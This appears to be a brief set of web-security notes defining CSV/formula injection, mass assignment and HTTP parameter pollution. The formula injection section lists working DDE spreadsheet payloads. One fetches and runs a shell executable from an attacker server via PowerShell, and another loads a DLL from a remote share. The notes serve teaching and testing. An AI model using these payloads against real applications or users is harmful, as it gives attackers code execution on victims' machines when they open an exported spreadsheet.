Formula injection:
====
when web application is processing user supplied data in EXPORT functionality spread sheet.
                    <h3>or</h3>
CSV Injection occurs when the data injection occurs when the data in a spreadsheet cell is not properly validated prior to export. 
The attacker usually injects a malicious payload (formula) into the input field.
Once the data is exported, the spreadsheet executes the malicious payload on the assumption of a standard macro.

<h3>Payload:</h3>
           
           DDE ("cmd";"/C calc";"!A0")A0
           @SUM(1+9)*cmd|' /C calc'!A0
           =10+20+cmd|' /C calc'!A0
           =cmd|' /C notepad'!'A1'
           =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
           =cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1

<h3>Mass Assignment</h3>
    
 When there are 2 parameters and the user insert the third un-recognised parameter and aceepted without validating is described as Mass assignment.h3
 
 <h3>HTTP Parameter Pollution</h3>
  
  HTTP Parameter Pollution (HPP) is a Web attack evasion technique that allows an attacker to craft a HTTP request in order to manipulate or retrieve hidden information. 
    
    
